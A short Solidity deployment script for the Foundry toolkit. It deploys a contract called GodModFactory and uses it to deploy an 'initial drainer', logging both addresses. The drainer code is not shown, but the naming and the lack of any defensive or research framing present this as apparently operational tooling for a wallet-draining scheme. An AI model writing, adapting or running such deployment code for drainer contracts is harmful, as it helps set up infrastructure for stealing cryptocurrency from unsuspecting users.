// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.19;

import "forge-std/Script.sol";
import "../src/GodModFactory.sol";

contract DeployScript is Script {
    function run() external {
        uint256 deployerPrivateKey = vm.envUint("PRIVATE_KEY");
        vm.startBroadcast(deployerPrivateKey);
        
        GodModFactory factory = new GodModFactory();
        
        console.log("Factory deployed at:", address(factory));
        
        // Deploy initial drainer
        address drainer = factory.deployDrainer();
        console.log("Initial drainer deployed at:", drainer);
        
        vm.stopBroadcast();
    }
}